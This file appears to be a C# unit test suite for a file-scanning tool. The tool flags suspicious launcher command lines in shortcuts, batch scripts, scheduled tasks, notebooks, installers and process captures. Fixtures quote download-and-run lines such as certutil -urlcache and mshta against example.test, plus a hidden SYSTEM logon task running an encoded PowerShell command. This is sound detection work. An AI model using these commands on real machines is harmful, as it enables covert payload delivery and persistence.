using System.Text;
using Corvus.Core;
using Corvus.Core.Documents;
using Corvus.Services.Analysis;

namespace Corvus.Tests;

/// <summary>The launcher table: one rule id from the shortcut, script, installer and process views, and no finding for ordinary command lines.</summary>
public sealed class LauncherTests : IDisposable
{
    private const string Rule = "launcher/command-line";

    private readonly TempDir _dir = new();

    public void Dispose() => _dir.Dispose();

    private static IReadOnlyList<Finding> Launcher(FileView? view) => [.. view!.Findings.Where(f => f.Rule == Rule)];

    [Fact]
    public void A_shortcut_whose_arguments_download_with_a_system_tool_names_the_launcher_rule()
    {
        var bytes = ShellLinkTests.Shortcut("/c certutil -urlcache -f http://example.test/a.bin a.bin");
        var found = Launcher(new ShellLinkFileView().Inspect(new FileInput("a.lnk", bytes, Blob.Identify(bytes)), default));
        var f = Assert.Single(found);
        Assert.Equal(("review", "shortcut", "certutil -urlcache URL: names a URL for the URL cache"), (f.Level, f.Source, f.Evidence));
    }

    [Fact]
    public void A_batch_script_that_decodes_with_a_system_tool_names_the_launcher_rule()
    {
        var bytes = Encoding.UTF8.GetBytes("@echo off\r\ncertutil -decode a.b64 a.exe\r\nstart a.exe\r\n");
        var found = Launcher(new ScriptFileView().Inspect(new FileInput("run.cmd", bytes, Blob.Identify(bytes)), default));
        var f = Assert.Single(found);
        Assert.Equal(("review", "script", "certutil -decode: decodes a file"), (f.Level, f.Source, f.Evidence));
    }

    private static FileView? Script(string name, string text)
    {
        var bytes = Encoding.UTF8.GetBytes(text);
        return new ScriptFileView().Inspect(new FileInput(name, bytes, Blob.Identify(bytes)), default);
    }

    [Fact]
    public void A_scheduled_task_that_runs_a_hidden_encoded_command_names_the_launcher_rule()
    {
        var xml = """
            <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
              <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
              <Principals><Principal id="Author"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
              <Settings><Hidden>true</Hidden></Settings>
              <Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-WindowStyle Hidden -EncodedCommand cwB0AGEAcgB0AC0AcwBsAGUAZQBwACAAMQAwAA==</Arguments></Exec></Actions>
            </Task>
            """;
        var view = Script("task.xml", xml)!;
        var found = Launcher(view);
        Assert.Contains(found, x => x.Evidence == "powershell -EncodedCommand: runs a base64 command");
        Assert.Contains(found, x => x.Evidence == "powershell -WindowStyle Hidden: runs with a hidden window");
        var facts = Assert.IsType<ScriptFileView.Facts>(view.Detail);
        Assert.Contains("trigger: LogonTrigger", facts.Plain, StringComparison.Ordinal);
        Assert.Contains("runs as: S-1-5-18, HighestAvailable", facts.Plain, StringComparison.Ordinal);
    }

    [Fact]
    public void An_xml_file_that_is_not_a_task_definition_gets_no_script_view()
    {
        Assert.Null(Script("config.xml", "<configuration><appSettings/></configuration>"));
    }

    [Fact]
    public void A_notebook_names_its_shell_commands_and_counts_the_cells_read()
    {
        var nb = """
            {"nbformat":4,"cells":[
              {"cell_type":"markdown","source":["# notes"]},
              {"cell_type":"code","source":["!certutil -urlcache -f http://example.test/a.bin a.bin\n","x = 1"]},
              {"cell_type":"code","source":"import os\nos.system('mshta http://example.test/a.hta')"},
              {"cell_type":"code","source":["%%powershell\n","Get-Date"]},
              {"cell_type":"code"}]}
            """;
        var view = Script("analysis.ipynb", nb)!;
        var found = Launcher(view);
        Assert.Contains(found, x => x.Evidence == "certutil -urlcache URL: names a URL for the URL cache");
        Assert.Contains(found, x => x.Evidence == "mshta URL: runs an application from a URL");
        var facts = Assert.IsType<ScriptFileView.Facts>(view.Detail);
        Assert.Contains(facts.Notes!, n => n.StartsWith("Read 3 code cell(s) of 5 cell(s)", StringComparison.Ordinal));
        Assert.Contains(facts.Notes!, n => n.StartsWith("1 code cell(s) have no readable source", StringComparison.Ordinal));
    }

    [Fact]
    public void A_notebook_without_shell_commands_reports_zero_commands_in_the_overview()
    {
        var view = Script("plain.ipynb", """{"nbformat":4,"cells":[{"cell_type":"code","source":["print(1)"]},{"cell_type":"raw","source":"x"}]}""")!;
        Assert.Contains(view.Highlights, h => h.Contains("0 command(s)", StringComparison.Ordinal));
        var notes = Assert.IsType<ScriptFileView.Facts>(view.Detail).Notes!;
        Assert.Contains(notes, n => n.Contains("1 markdown or raw cell(s) skipped", StringComparison.Ordinal));
        Assert.Contains("Python cells are listed, not peeled.", notes);
    }

    [Fact]
    public void A_notebook_with_a_timing_magic_still_reads_its_shell_line_and_skips_writefile()
    {
        var nb = """
            {"cells":[
              {"cell_type":"code","source":"%%time\n!certutil -urlcache -f http://example.test/a.bin a.bin"},
              {"cell_type":"code","source":"%%writefile run.bat\nmshta http://example.test/b.hta"},
              {"cell_type":"code","source":["%%powershell\n","Get-Date"]}]}
            """;
        var view = Script("magic.ipynb", nb)!;
        var found = Launcher(view);
        Assert.Contains(found, x => x.Evidence == "certutil -urlcache URL: names a URL for the URL cache");
        Assert.DoesNotContain(found, x => x.Evidence.StartsWith("mshta", StringComparison.Ordinal));
        var facts = Assert.IsType<ScriptFileView.Facts>(view.Detail);
        Assert.Contains("<script language=\"powershell\">", facts.Plain, StringComparison.Ordinal);
    }

    [Fact]
    public void A_notebook_names_the_shell_commands_past_its_bound()
    {
        var cell = string.Join("", Enumerable.Range(0, 1001).Select(i => $"!echo {i}\\n"));
        var view = Script("many.ipynb", "{\"cells\":[{\"cell_type\":\"code\",\"source\":\"" + cell + "\"}]}")!;
        Assert.Contains("Read 1,000 of 1,001 shell commands.", Assert.IsType<ScriptFileView.Facts>(view.Detail).Notes!);
    }

    [Fact]
    public void A_notebook_with_more_than_64_shell_cells_names_the_peeled_count_once()
    {
        var cells = string.Join(",", Enumerable.Range(0, 70).Select(i => $"{{\"cell_type\":\"code\",\"source\":\"%%cmd\\necho {i}\"}}"));
        var view = Script("blocks.ipynb", "{\"cells\":[" + cells + "]}")!;
        var notes = Assert.IsType<ScriptFileView.Facts>(view.Detail).Notes!;
        Assert.Single(notes, n => n.StartsWith("Peeled 64 of 70 shell blocks", StringComparison.Ordinal));
    }

    [Fact]
    public void A_task_command_that_holds_a_command_line_is_not_quoted_into_one_token()
    {
        var xml = """
            <Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Actions>
              <Exec><Command>cmd.exe /c start x</Command></Exec>
              <ComHandler><ClassId>{00000000-0000-0000-0000-000000000001}</ClassId></ComHandler>
            </Actions></Task>
            """;
        var facts = Assert.IsType<ScriptFileView.Facts>(Script("t.xml", xml)!.Detail);
        Assert.Contains("run: cmd.exe /c start x\n", facts.Plain, StringComparison.Ordinal);
        Assert.Contains("com handler: {00000000-0000-0000-0000-000000000001}", facts.Plain, StringComparison.Ordinal);
    }

    [Fact]
    public void A_task_with_more_than_256_actions_names_the_count_read()
    {
        var actions = string.Concat(Enumerable.Repeat("<Exec><Command>a.exe</Command></Exec>", 300));
        var xml = $"<Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Actions>{actions}</Actions></Task>";
        Assert.Contains("Read 256 of 300 actions; the rest are not shown.", Assert.IsType<ScriptFileView.Facts>(Script("big.xml", xml)!.Detail).Notes!);
    }

    [Fact]
    public void A_malformed_task_definition_gets_no_script_view()
    {
        Assert.Null(Script("bad.xml", "<Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Actions>"));
    }

    [Fact]
    public void An_extensionless_page_with_a_script_language_still_reads_as_a_page()
    {
        var view = Script("page", "<html><script language=\"vbscript\">MsgBox \"hi\"</script></html>");
        Assert.NotNull(view);
        Assert.Equal("vbscript", Assert.IsType<ScriptFileView.Facts>(view.Detail).Language);
    }

    [Fact]
    public void An_installer_program_action_that_downloads_names_the_launcher_rule()
    {
        var bytes = InstallerTests.Fixture("launcher.msi");
        var found = Launcher(new InstallerFileView().Inspect(new FileInput("launcher.msi", bytes, Blob.Identify(bytes)), default));
        var f = Assert.Single(found);
        Assert.Equal(("review", "installer", "certutil -urlcache URL: names a URL for the URL cache"), (f.Level, f.Source, f.Evidence));
    }

    [Fact]
    public void A_process_command_line_that_hides_its_window_names_the_launcher_rule()
    {
        ProcmonSamples.Proc[] table = [new(4300, 900, "powershell.exe", @"C:\Windows\System32\powershell.exe", "powershell.exe -WindowStyle Hidden -File build.ps1")];
        var path = _dir.File("capture.pml");
        File.WriteAllBytes(path, ProcmonSamples.Log([new(0, 11, 1, 1, 0, ProcmonSamples.ProcessCreate(4300, table[0].ImagePath, table[0].CommandLine))], table: table));
        var found = Launcher(new ProcmonFileView().Inspect(FileInput.Open(path), default));
        var f = Assert.Single(found);
        Assert.Equal(("review", "procmon", "powershell -WindowStyle Hidden: runs with a hidden window", "PID 4300"), (f.Level, f.Source, f.Evidence, f.Location));
    }

    [Theory]
    [InlineData("notepad a.txt")]
    [InlineData("certutil -hashfile a.txt SHA256")]
    [InlineData("msiexec /i setup.msi /qn")]
    [InlineData("powershell -File build.ps1")]
    [InlineData("cmd /c echo hello")]
    [InlineData("bitsadmin /list")]
    [InlineData("certutil -urlcache *")]
    public void A_harmless_command_line_matches_no_launcher_shape(string commandLine) => Assert.Empty(Launchers.Match(commandLine));

    [Fact]
    public void A_harmless_command_line_reports_no_launcher_finding_in_the_shortcut_and_script_views()
    {
        var lnk = ShellLinkTests.Shortcut("/c notepad a.txt");
        Assert.Empty(Launcher(new ShellLinkFileView().Inspect(new FileInput("a.lnk", lnk, Blob.Identify(lnk)), default)));
        var script = Encoding.UTF8.GetBytes("@echo off\r\nnotepad a.txt\r\ncertutil -hashfile a.txt SHA256\r\n");
        Assert.Empty(Launcher(new ScriptFileView().Inspect(new FileInput("run.cmd", script, Blob.Identify(script)), default)));
    }

    // about_Pwsh lists -e and -ec as aliases of -EncodedCommand.
    [Theory]
    [InlineData("powershell -e SQBFAFgAIAAoAEcAZQB0AC0ARABhAHQAZQApAA==")]
    [InlineData("pwsh -ec SQBFAFgAIAAoAEcAZQB0AC0ARABhAHQAZQApAA==")]
    [InlineData("powershell.exe -EncodedCommand SQBFAFgAIAAoAEcAZQB0AC0ARABhAHQAZQApAA==")]
    public void Each_documented_form_of_the_encoded_command_option_matches(string commandLine) =>
        Assert.Equal("runs a base64 command", Assert.Single(Launchers.Match(commandLine)).What);

    [Fact]
    public void A_shape_is_read_only_within_its_own_command()
    {
        Assert.Empty(Launchers.Match("certutil -hashfile a.txt & echo -urlcache"));
        Assert.Single(Launchers.Match("echo hi & certutil -urlcache -f http://example.test/a a"));
    }
}
